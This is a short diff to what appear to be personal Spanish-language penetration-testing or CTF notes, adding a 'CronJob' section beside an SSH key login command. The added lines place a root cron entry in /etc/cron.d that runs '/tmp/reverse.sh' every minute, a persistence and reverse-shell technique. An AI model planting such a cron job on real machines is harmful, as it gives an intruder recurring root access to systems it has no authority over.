@@ -57,6 +57,13 @@ cd .ssh
 
 ssh -i id_rsa strapi@10.10.14.57 
 ```
+## CronJob
+
+Para hacer que jale un cron ponlo en la carpeta /etc/cron.d
+
+```
+* * * * * root sh /tmp/reverse.sh
+```
 
 ## Nmap
 
